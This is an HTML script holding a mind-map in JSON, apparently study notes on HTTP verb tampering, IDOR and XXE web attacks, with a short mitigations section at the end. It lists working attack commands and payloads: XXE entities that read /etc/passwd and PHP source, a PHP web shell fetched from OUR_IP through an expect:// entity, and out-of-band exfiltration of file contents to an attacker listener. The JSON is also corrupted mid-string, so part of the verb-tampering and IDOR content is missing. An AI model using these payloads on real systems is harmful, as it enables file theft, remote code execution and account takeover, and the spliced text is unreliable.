  <script>
    const data = {"content":"Web Attacks","children":[{"content":"&#x1f3af; Main Idea","children":[{"content":"Covers three common web attacks: HTTP Verb Tampering, IDOR, and XXE Injection.","children":[],"payload":{"tag":"li","lines":"2,3"}},{"content":"Goal: bypass authorization/security filters, access other users&apos; data, and disclose local files / achieve RCE.","children":[],"payload":{"tag":"li","lines":"3,4"}},{"content":"All three stem from misconfigurations or missing back-end access control / input handling.","children":[],"payload":{"tag":"li","lines":"4,6"}}],"payload":{"tag":"h2","lines":"1,2"}},{"content":"&#x1f4a5; Attack / Exploit Vectors","children":[{"content":"HTTP Verb Tampering &#x2014; Bypass Basic Auth (Insecure Config)","children":[{"content":"Auth config limited to specific verbs (<code>&lt;Limit GET POST&gt;<\/code>) leaves other methods unprotected.","children":[],"payload":{"tag":"li","lines":"9,10"}},{"content":"Try alternate verbs (HEAD, PUT, DELETE, OPTIONS, PATCH) to reach restricted functions.","children":[],"payload":{"tag":"li","lines":"10,11"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>curl -i -X OPTIONS http://SERVER_IP:PORT/<\/code> &#x2014; list allowed methods (<code>Allow:<\/code> header)","children":[],"payload":{"tag":"li","lines":"12,13"}},{"content":"Burp &quot;Change Request Method&quot; &#x2192; switch GET/POST &#x2192; HEAD to trigger <code>/admin/reset.php<\/code>","children":[],"payload":{"tag":"li","lines":"13,15"}}],"payload":{"tag":"li","lines":"11,15"}}],"payload":{"tag":"h3","lines":"8,9"}},{"content":"HTTP Verb Tampering &#x2014; Bypass Security Filters (Insecure Coding)","children":[{"content":"Filter checks only one method (e.g. <code>&#x24;_POST<\/code>) while action uses <code>&#x24;_REQUEST<\/code> &#x2014; switch verb to evade.","children":[],"payload":{"tag":"li","lines":"16,17"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"Change POST&#x2192;GET in Burp ":{"tag":"h3","lines":"28,29"}},{"content":"IDOR &#x2014; Bypassing Encoded/Hashed References","children":[{"content":"Reverse front-end hashing when function is disclosed in JS (CryptoJS, btoa).","children":[],"payload":{"tag":"li","lines":"35,36"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>echo -n 1 | md5sum<\/code> &#x2014; test plain md5 of uid","children":[],"payload":{"tag":"li","lines":"37,38"}},{"content":"<code>echo -n 1 | base64 -w 0 | md5sum<\/code> &#x2014; replicate <code>CryptoJS.MD5(btoa(uid))<\/code> (note <code>-n<\/code>/<code>-w 0<\/code>)","children":[],"payload":{"tag":"li","lines":"38,39"}},{"content":"<code>for i in {1..10}; do echo -n &#x24;i | base64 -w 0 | md5sum | tr -d &apos; -&apos;; done<\/code> &#x2014; compute all hashes","children":[],"payload":{"tag":"li","lines":"39,40"}},{"content":"<code>curl -sOJ -X POST -d &quot;contract=&#x24;hash&quot; http://SERVER_IP:PORT/download.php<\/code> &#x2014; mass download contracts","children":[],"payload":{"tag":"li","lines":"40,42"}}],"payload":{"tag":"li","lines":"36,42"}}],"payload":{"tag":"h3","lines":"34,35"}},{"content":"IDOR &#x2014; Insecure APIs (Function Calls)","children":[{"content":"Client-controlled params (uid, uuid, role, role cookie) manipulated to act as/modify other users.","children":[],"payload":{"tag":"li","lines":"43,44"}},{"content":"Methods: PUT=update, POST=create, DELETE=delete, GET=read.","children":[],"payload":{"tag":"li","lines":"44,45"}},{"content":"Back-end checks <code>uid<\/code>/<code>uuid<\/code> mismatch; creating/deleting gated by <code>role<\/code> cookie.","children":[],"payload":{"tag":"li","lines":"45,47"}}],"payload":{"tag":"h3","lines":"42,43"}},{"content":"IDOR &#x2014; Chaining Vulnerabilities","children":[{"content":"GET request on API leaks other users&apos; details (Information Disclosure) &#x2192; get their uuid.","children":[],"payload":{"tag":"li","lines":"48,49"}},{"content":"Use leaked uuid to PUT-modify their profile; enumerate all users to find admin role (<code>web_admin<\/code>).","children":[],"payload":{"tag":"li","lines":"49,50"}},{"content":"Set own role to <code>web_admin<\/code> (no back-end check) &#x2192; create/delete users, mass-assign (XSS in <code>about<\/code>, change emails).","children":[],"payload":{"tag":"li","lines":"50,51"}},{"content":"Follow-on: change victim email &#x2192; password reset &#x2192; account takeover.","children":[],"payload":{"tag":"li","lines":"51,53"}}],"payload":{"tag":"h3","lines":"47,48"}},{"content":"XXE &#x2014; Local File Disclosure","children":[{"content":"Web app parses user XML with outdated library; inject external entity to read files.","children":[],"payload":{"tag":"li","lines":"54,55"}},{"content":"Confirm by defining internal entity and seeing it reflected.","children":[],"payload":{"tag":"li","lines":"55,56"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>&lt;!DOCTYPE email [ &lt;!ENTITY company &quot;Inlane Freight&quot;&gt; ]&gt;<\/code> + <code>&amp;company;<\/code> &#x2014; confirm entity injection","children":[],"payload":{"tag":"li","lines":"57,58"}},{"content":"<code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;<\/code> &#x2014; read local file","children":[],"payload":{"tag":"li","lines":"58,59"}},{"content":"<code>&lt;!ENTITY company SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;<\/code> &#x2014; read PHP source (base64)","children":[],"payload":{"tag":"li","lines":"59,60"}},{"content":"Change <code>Content-Type<\/code> to <code>application/xml<\/code> if app defaults to JSON","children":[],"payload":{"tag":"li","lines":"60,62"}}],"payload":{"tag":"li","lines":"56,62"}}],"payload":{"tag":"h3","lines":"53,54"}},{"content":"XXE &#x2014; Remote Code Execution","children":[{"content":"Via ssh keys, Windows hash stealing, or PHP <code>expect://<\/code> module (if enabled).","children":[],"payload":{"tag":"li","lines":"63,64"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>echo &apos;&lt;?php system(&#x24;_REQUEST[&quot;cmd&quot;]);?&gt;&apos; &gt; shell.php; sudo python3 -m http.server 80<\/code>","children":[],"payload":{"tag":"li","lines":"65,66"}},{"content":"<code>&lt;!ENTITY company SYSTEM &quot;expect://curl&#x24;IFS-O&#x24;IFS&apos;OUR_IP/shell.php&apos;&quot;&gt;<\/code> &#x2014; fetch web shell (use <code>&#x24;IFS<\/code> for spaces)","children":[],"payload":{"tag":"li","lines":"66,68"}}],"payload":{"tag":"li","lines":"64,68"}}],"payload":{"tag":"h3","lines":"62,63"}},{"content":"XXE &#x2014; Advanced File Disclosure (CDATA)","children":[{"content":"Wrap non-XML-conforming content in CDATA using external parameter entities (joined via external DTD).","children":[],"payload":{"tag":"li","lines":"69,70"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>echo &apos;&lt;!ENTITY joined &quot;%begin;%file;%end;&quot;&gt;&apos; &gt; xxe.dtd; python3 -m http.server 8000<\/code>","children":[],"payload":{"tag":"li","lines":"71,72"}},{"content":"DTD payload defines <code>%begin &quot;&lt;![CDATA[&quot;<\/code>, <code>%file SYSTEM &quot;file:///...&quot;<\/code>, <code>%end &quot;]]&gt;&quot;<\/code>, references <code>%xxe;<\/code>","children":[],"payload":{"tag":"li","lines":"72,74"}}],"payload":{"tag":"li","lines":"70,74"}}],"payload":{"tag":"h3","lines":"68,69"}},{"content":"XXE &#x2014; Error-Based (semi-blind)","children":[{"content":"When no entity is reflected but runtime errors show; force error that leaks file content.","children":[],"payload":{"tag":"li","lines":"75,76"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>&lt;!ENTITY % error &quot;&lt;!ENTITY content SYSTEM &apos;%nonExistingEntity;/%file;&apos;&gt;&quot;&gt;<\/code> &#x2014; leak file via error message","children":[],"payload":{"tag":"li","lines":"77,78"}},{"content":"Send malformed XML (e.g. <code>&lt;roo&gt;<\/code>) to trigger error / reveal web root","children":[],"payload":{"tag":"li","lines":"78,80"}}],"payload":{"tag":"li","lines":"76,80"}}],"payload":{"tag":"h3","lines":"74,75"}},{"content":"XXE &#x2014; Blind OOB Data Exfiltration","children":[{"content":"No output, no errors: make server send file content to attacker server.","children":[],"payload":{"tag":"li","lines":"81,82"}},{"content":"<strong>Commands<\/strong>","children":[{"content":"<code>&lt;!ENTITY % oob &quot;&lt;!ENTITY content SYSTEM &apos;http://OUR_IP:8000/?content=%file;&apos;&gt;&quot;&gt;<\/code> &#x2014; OOB exfil","children":[],"payload":{"tag":"li","lines":"83,84"}},{"content":"<code>&lt;?php if(isset(&#x24;_GET[&apos;content&apos;])){ error_log(base64_decode(&#x24;_GET[&apos;content&apos;])); }<\/code> &#x2014; receiver script","children":[],"payload":{"tag":"li","lines":"84,85"}},{"content":"<code>php -S 0.0.0.0:8000<\/code> &#x2014; host listener","children":[],"payload":{"tag":"li","lines":"85,86"}},{"content":"<code>ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter<\/code> &#x2014; automated","children":[],"payload":{"tag":"li","lines":"86,88"}}],"payload":{"tag":"li","lines":"82,88"}}],"payload":{"tag":"h3","lines":"80,81"}},{"content":"XXE &#x2014; Denial of Service","children":[{"content":"Billion laughs / entity self-reference loop (<code>&amp;a10;<\/code>) exhausts memory (blocked by modern servers).","children":[],"payload":{"tag":"li","lines":"89,91"}}],"payload":{"tag":"h3","lines":"88,89"}}],"payload":{"tag":"h2","lines":"6,7"}},{"content":"&#x1f6e0;&#xfe0f; Key Tools &amp; Concepts","children":[{"content":"curl &#x2014; set HTTP methods (<code>-X<\/code>), mass download","children":[],"payload":{"tag":"li","lines":"92,93"}},{"content":"Burp Suite / ZAP &#x2014; intercept, Change Request Method, Intruder/Fuzzer, Comparer, Inspector","children":[],"payload":{"tag":"li","lines":"93,94"}},{"content":"md5sum / base64 &#x2014; reverse encoded/hashed object references","children":[],"payload":{"tag":"li","lines":"94,95"}},{"content":"XXEinjector &#x2014; automate XXE (CDATA, error-based, blind OOB)","children":[],"payload":{"tag":"li","lines":"95,96"}},{"content":"XML concepts: DTD, internal/external entities, parameter entities (<code>%<\/code>), CDATA, SYSTEM/PUBLIC","children":[],"payload":{"tag":"li","lines":"96,97"}},{"content":"php://filter, file://, expect:// wrappers","children":[],"payload":{"tag":"li","lines":"97,99"}}],"payload":{"tag":"h2","lines":"91,92"}},{"content":"&#x1f6e1;&#xfe0f; Mitigations","children":[{"content":"Verb Tampering: never restrict auth to specific verbs; use <code>LimitExcept<\/code>/<code>http-method-omission<\/code>; test all params (<code>&#x24;_REQUEST<\/code>); disable HEAD if unneeded; consistent HTTP method use.","children":[],"payload":{"tag":"li","lines":"100,101"}},{"content":"IDOR: implement back-end object-level access control (RBAC) mapped from session token, not client input; use strong refs (UUID v4, salted hashes); never hash on front-end.","children":[],"payload":{"tag":"li","lines":"101,102"}},{"content":"XXE: update XML libraries/parsers (avoid deprecated <code>libxml_disable_entity_loader<\/code>); disable custom DTDs, external entities, parameter entities, XInclude, entity loops; disable runtime errors; prefer JSON/YAML over XML/SOAP; use WAF as extra layer.","children":[],"payload":{"tag":"li","lines":"102,103"}}],"payload":{"tag":"h2","lines":"99,100"}}],"payload":{"tag":"h1","lines":"0,1"}}
